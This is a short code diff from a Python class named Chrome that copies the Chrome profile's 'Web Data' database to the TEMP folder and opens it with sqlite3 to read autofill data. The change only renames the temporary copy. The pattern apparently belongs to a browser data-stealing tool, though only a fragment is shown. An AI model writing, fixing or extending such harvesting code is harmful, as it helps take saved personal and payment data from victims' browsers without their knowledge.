@@ -98,7 +98,7 @@ class Chrome:
     def autofill(self):
         try:
             web_data_db = self._user_data + "\\Default\\Web Data"
-            web_data_db_copy = os.getenv("TEMP") + "\\History.db"
+            web_data_db_copy = os.getenv("TEMP") + "\\Web Data.db"
             shutil.copy2(web_data_db, web_data_db_copy)
             conn = sqlite3.connect(web_data_db_copy)
             cursor = conn.cursor()
